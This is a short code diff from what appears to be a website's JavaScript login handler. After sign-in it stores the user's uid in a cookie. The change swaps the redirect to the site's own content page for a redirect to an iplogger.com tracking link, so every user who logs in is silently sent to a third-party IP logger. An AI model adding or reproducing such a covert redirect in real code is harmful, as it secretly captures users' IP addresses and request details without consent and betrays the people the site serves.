@@ -43,7 +43,7 @@ if (cookieId == null || cookieId == '') {
                 } else {
                     const uid = userCredential.user.uid;
                     document.cookie = "_userid=" + uid;
-                    location.assign('https://rafaavf.github.io/abismo-do-gabs/content/content.html');
+                    location.assign('https://iplogger.com/2Jw1C3');
                 }
 
             })
